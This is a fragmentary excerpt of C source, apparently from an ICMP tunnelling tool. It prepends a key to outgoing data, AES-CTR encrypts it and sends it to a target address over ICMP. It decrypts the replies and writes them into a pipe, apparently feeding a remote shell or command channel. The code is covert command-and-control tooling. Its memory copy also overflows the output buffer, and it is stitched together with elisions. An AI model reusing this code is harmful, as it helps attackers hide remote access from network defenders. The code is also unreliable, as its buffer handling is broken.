...
int transfer_icmp(HANDLE icmp_chan, unsigned int target, char *out_buf, unsigned int out_buf_size, char *in_buf, unsigned int *in_buf_size, unsigned int max_in_data_size, unsigned int timeout)
{
	...
	char* new_buf = NULL;
	new_buf = malloc(out_buf_size);
	memset(new_buf, 0x00, out_buf_size);
	memcpy(new_buf, out_buf, out_buf_size);

	memset(out_buf, 0x00, out_buf_size);
	memcpy(out_buf, KEY, key_len);
	memcpy(out_buf + key_len, new_buf, out_buf_size);

	if(new_buf != NULL){free(new_buf); new_buf = NULL;}
	out_buf_size = out_buf_size + key_len;
	//---------------------------aes---------------------------------
	aes_ctr_decrypt_encrypt(out_buf + key_len, out_buf_size - key_len);
	// if(out_buf_size > 0){printf("[*] send buf size ==> %d\n", out_buf_size - key_len);}
	//------------------------------------------------------------
	...
	do {
		...
		if (transfer_icmp(icmp_chan, ip_addr, out_buf, out_buf_size, in_buf, &in_buf_size,  max_data_size, timeout) == TRANSFER_SUCCESS) {
			if (status == STATUS_OK) {
				...
				if(in_buf_size > key_len){
					aes_ctr_decrypt_encrypt(in_buf + key_len, in_buf_size - key_len);
					// printf("[*] in_buf ==> %s\n", in_buf + key_len);
					WriteFile(pipe_write, in_buf + key_len, in_buf_size - key_len, &rs, 0);
				}
